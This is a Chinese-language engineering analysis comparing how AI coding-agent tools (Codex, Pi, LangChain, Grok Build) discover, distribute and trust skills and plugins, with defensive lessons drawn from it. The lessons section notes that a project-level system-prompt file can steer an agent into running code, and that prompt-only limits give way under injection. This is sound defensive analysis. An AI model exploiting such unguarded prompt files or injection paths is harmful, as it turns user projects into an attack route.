**Codex：自己造一套超集，同时向下兼容别家。** 基础 frontmatter 跟标准一致（name ≤ 64、description ≤ 1024），但加了 `agents/openai.yaml`（展示元数据）、`policy`（隐式调用开关 + 产品门控）、`dependencies.tools`（工具依赖声明）、四级 scope、脚本执行审批、插件归因。同时兼容 `.claude-plugin/` 和 `.cursor-plugin/` 的清单，也用 `~/.agents/skills`。态度是：**标准不够用，我们扩展它，但保持能读别人的东西。**

**LangChain：没有这个概念。** 零命中。理由不是疏忽，而是定位——skill 的核心价值是「渐进式披露」（只把描述放进上下文，用到才加载全文），这在框架层面是个 prompt 工程模式，不是运行时抽象。用户想要就自己拼。态度是：**这是应用层的事。**

三家在 `~/.agents/skills` 这个路径上的自发收敛，是这个格式正在变成事实标准的最硬证据——两个竞品项目、不同语言、不同公司，都选了同一个目录名。（第四个样本 Grok Build 的 skills 发现路径同样包含 `.agents/skills/`，把"两个竞品"变成了三个，见第 8 节。）

## 6. 可以拿走的工程经验

**1. 把优先级写成一个纯函数，而不是散在加载流程里。** Pi 的 `resourcePrecedenceRank` 是 5 行，返回一个整数，排序时用。这带来两个好处：规则可以被完整地写进文档表格；新增来源类型时只改一个地方。反例是把优先级隐含在「谁先被 push 进数组」里——那样规则会随重构漂移，而且没法测试。**适用条件**：来源类型有限且能全序排列。如果需要「某些来源只在某些条件下参与排序」，纯函数会退化，那时应该显式建模成规则列表（Codex 的 skill config rules 就是这个形态）。

**2. 「需要授权才能加载的资源」要有一份硬编码清单，而且要包含系统提示词文件。** Pi 的 `TRUST_REQUIRING_PROJECT_CONFIG_RESOURCES` 把 `SYSTEM.md` 和 `APPEND_SYSTEM.md` 跟 `extensions` 放在同一级。很多实现只把「能执行的代码」列为敏感，忘了「能改系统提示词」在 agent 场景下等价于任意代码执行——因为改了提示词就能让模型主动去执行东西。**适用条件**：任何允许项目级配置覆盖的 agent。

**3. 信任判定 fail-closed，扩展加载 fail-soft。** Pi 在没有 UI 时 `return false`（宁可少加载），在单个扩展抛异常时 catch 掉继续（宁可少一个功能也不要启动不了）。这两个方向必须分开决定，不能用同一个 error handling 策略一刀切。**适用条件**：通用。判断标准是「这个失败如果被静默放行，最坏后果是什么」。

**4. 下载第三方包时，用能力最窄的那条命令。** Codex 用 `npm pack --ignore-scripts` 而不是 `npm install`，因为它只需要文件内容不需要依赖树，于是顺便躲开了整个 lifecycle script 攻击面；再叠加归档大小上限和包名校验。如果你的场景确实需要依赖（像 Pi 那样），退而求其次的组合是：pin 精确版本 + shrinkwrap + `--ignore-scripts` + lifecycle script 白名单 + 定期 `npm audit signatures`。**适用条件**：任何从公开 registry 拉取代码的工具。`min-release-age` 这条尤其便宜有效——绝大多数供应链投毒在发布后几小时内就被发现并撤下。

**5. 如果要让模型能请求安装东西，把提名范围做成封闭白名单，而不是靠 prompt 约束。** Codex 的工具描述写了三段「only when」，但真正兜底的是 `TOOL_SUGGEST_DISCOVERABLE_PLUGIN_ALLOWLIST` 那 30 项硬编码 ID，以及「必须匹配上一个工具返回过的条目」。prompt 里的约束在 injection 面前是纸糊的，代码里的 allowlist 不是。另外三个细节值得抄：**必填的用户可见理由**、**禁止并行调用**（防授权疲劳）、**低保真 UI 下直接关掉这个能力**。**适用条件**：只有当你的插件生态确实是策展的时候这条才成立；开放生态里做不出有意义的白名单，那就不该给模型这个能力。

**6. 不做沙箱要写进文档，并说明理由。** Pi 的 `docs/security.md` 花了一整节解释为什么不做半吊子沙箱（「would be easy to misunderstand as a security boundary」），并给出替代方案（容器化文档）。这比默默不做强得多——用户对「有没有保护」的错误预期，比没有保护更危险。**适用条件**：任何不打算做隔离的本地工具。

## 8. 第四个样本：Grok Build

> 调研时间 2026-08-06，`xai-org/grok-build` commit `a5589e9`；全项目背景见 [17 番外](./17-番外-GrokBuild全项目速览.md)。本节只看插件与扩展分发维度。

**本章视角下 Grok Build 最重要的判断只有一个：它不建自己的生态，直接寄生 Claude Code 的生态。** 本章第 0 节说分发的第一难题是冷启动——没插件就没用户、没用户就没插件。Grok 的解法是把竞品的文件约定当作事实标准来实现，让 Claude Code 用户的全部配置资产零成本迁移：

- **skills**：SKILL.md + frontmatter，字段是 Claude Code 的**超集**（多 `when-to-use`、`compatibility`、`user-invocable`、`disable-model-invocation` 等，解析处 `xai-grok-tools/src/implementations/skills/discovery.rs:465-565`；`allowed-tools` 连 `Bash(git diff:*)` 语法都支持）。发现路径：`.grok/skills/`、**`.claude/skills/`**（`compat.claude.skills` 开关默认开）、**`.cursor/skills/`**、**`.agents/skills/`**（discovery.rs:23-26）——第 5 节说的路径收敛，第四个样本再投一票。
- **agents**：用户自定义 agent 发现顺序里排在 bundled 之前的是 **`~/.claude/agents/`**（`xai-grok-agent/src/discovery.rs:186-189`）。
- **插件清单**：`plugin.json` 缺失时兜底顺序是 `.grok-plugin/plugin.json` → **`.claude-plugin/plugin.json`**（`plugins/manifest.rs:1-14`）；发现层的 `PluginOrigin` 枚举直接内置 `ProjectClaude(.claude/plugins/)`、`UserClaude(~/.claude/plugins/)`、`ClaudeMarketplace`、`ClaudeInstalled(installed_plugins.json)` 四个变体（`xai-hooks-plugins-types/src/lib.rs:36-75`）。
- **一键搬家**：TUI 有 `/import-claude` 命令，扫 `.claude/settings*.json`、`~/.claude.json`、`.mcp.json`（`pager/src/slash/commands/import_claude.rs:5`）。
- 甚至有**厂商内置 skill 黑名单**：Claude 的 `pdf/docx/xlsx/pptx/skill-creator`、Cursor 的 14 个默认 skill，仅当位于对应厂商目录下才剔除（discovery.rs:33-66）——精确到知道该跳过对家哪些自带件，兼容做到了运维级别。

**分发机制本身**（对照第 3 节 Codex 的七层防线，Grok 简陋得多）：marketplace = git 仓库，官方源硬编码 `https://github.com/xai-org/plugin-marketplace.git`（`xai-grok-shell/src/plugin.rs:1588`），额外源在 config.toml 的 `[[marketplace.sources]]`。**无签名、无审核**（全 crate grep `signature|signing|verify` 零命中）；唯一供应链加固是 commit-sha 钉扎，`require_sha` **默认关**、tighten-only（env 或 config 任一可开、都不能关回去，`plugin-marketplace/src/config.rs:34-39`）。没有 Codex 式的模型提名白名单，也没有企业级源白名单。

**信任模型**落在执行面（`xai-grok-agent/src/plugins/trust.rs:1-25`），和 Pi 的 Project Trust 同题：项目级插件默认不信任——skills/agents 只列元数据，**hooks、MCP server、脚本被阻止**，按插件根目录逐个授信（存 `~/.grok/trusted-plugins`）；CLI `--plugin-dir` 传入的永远受信。粒度比 Pi 的"整个项目一个门"细（按插件目录），比 Codex 的四级 scope + 归因体系粗。

放进第 5 节的坐标系：Pi 把 skills 当跨 harness 公共标准、Codex 造超集向下兼容、LangChain 拒绝这个概念——**Grok Build 是第四种态度：别人的标准就是我的标准**。这对用户是无摩擦，对生态的含义则微妙：当最大竞品的文件格式被后发者原样实现时，格式的实际控制权仍在 Anthropic 手里，Grok 等于把自己扩展生态的 schema 演进权外包给了对手。

本节未确认：官方 marketplace 仓库 `xai-org/plugin-marketplace` 的实际内容与仓库侧 CI 审核流程（仓库外资源，未抓取）；插件安装后的更新/回滚语义未追查。
